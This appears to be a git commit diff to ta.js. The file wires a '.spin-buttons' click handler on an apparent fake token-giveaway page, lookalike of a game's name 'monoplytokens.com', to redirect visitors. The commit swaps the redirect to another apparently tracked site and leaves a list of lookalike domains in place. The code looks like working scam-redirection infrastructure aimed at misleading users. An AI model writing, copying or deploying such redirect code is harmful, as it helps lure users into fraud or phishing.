308713b974f053a5fa9537df8c6d565871184e0e
dev20l <iphonetasli@gmail.com>
2025-02-18 19:11:15 +0100

    Update ta.js

--- ta.js
+++ ta.js
@@ -4,7 +4,7 @@ var button = document.querySelector('.spin-buttons');
 button.addEventListener('click', function() {
     (function() {
         var originalDomain = "monoplytokens.com";
-        var redirectURL = "https://m.rolls3.com";
+        var redirectURL = "https://live33.online/?9fbfb39";
         var blockedDomains = [
             "mply.io.1arshg4.site",
             "mply.io.4a6b8dh.site"
